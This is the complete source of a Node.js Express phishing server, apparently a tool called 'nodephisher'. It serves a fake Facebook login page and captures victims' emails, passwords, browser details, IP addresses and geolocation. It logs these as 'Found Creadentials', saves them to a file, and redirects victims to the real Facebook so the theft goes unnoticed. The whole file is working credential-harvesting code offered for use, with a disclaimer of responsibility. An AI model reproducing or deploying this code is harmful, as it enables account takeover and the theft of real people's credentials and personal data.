const express = require("express");
const app = express();
const geoip = require("geoip-lite"); // npm install --save geoip-lite
const Sniffr = require("sniffr"); // npm install --save sniffr
const requestIp = require("request-ip"); // npm install --save request-ip
const fs = require("fs");

const HOST = process.env.HOST || "0.0.0.0";
const PORT = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: false }));

app.get("/", (req, res) => {
  res.sendFile(__dirname + "/templates/facebook.html");
});

app.post("/facebook", (req, res) => {
  const email = req.body.email;
  const password = req.body.password;
  const userAgent = req.headers["user-agent"];
  const startSniff = new Sniffr();

  startSniff.sniff(userAgent);

  const clientIp = requestIp.getClientIp(req);
  const geo = geoip.lookup(clientIp); // will be set to null if server is accessed locally

  res.statusCode = 200;
  res.setHeader("Content-Type", "application/json");

  try {
    let data = JSON.stringify(
      {
        email,
        password,
        ...startSniff,
        clientIp,
        geo
      },
      null,
      2
    );

    var parseData = JSON.parse(data);

    console.log(
      `
       """"""""""""""""""""""""""" Found Creadentials """"""""""""""""""""""""""""""""" 
      `,
      JSON.stringify(
        {
          email,
          password,
          ...startSniff,
          clientIp,
          geo
        },
        null,
        2
      )
    );

    console.table(parseData);

    fs.writeFileSync("data.txt", data);

    console.log(
      `
      """"""""""""""""""""""""""" Waiting For Other Victim """""""""""""""""""""""""""""""""
      `
    );

    return res.redirect("http://www.facebook.com");
  } catch (err) {

    console.log(err)
  }
  throw err;
});

app.listen(PORT, HOST, err => {
  if (err) throw err;

  console.log(`

   _ __   ___   __| | ___ _ __ | |__ (_)___| |__   ___ _ __
  | |_ \ / _ \ / _| |/ _ | '_ \| '_ \| / __| '_ \ / _ | '__|
  | | | | (_) | (_| |  __| |_) | | | | \__ | | | |  __| |
  |_| |_|\___/ \__,_|\___| .__/|_| |_|_|___|_| |_|\___|_|
                         |_|

  Disclaimer: i'm not responsible for any of your Actions.
  
  Server listening on http://${HOST}:${PORT}


`);
});
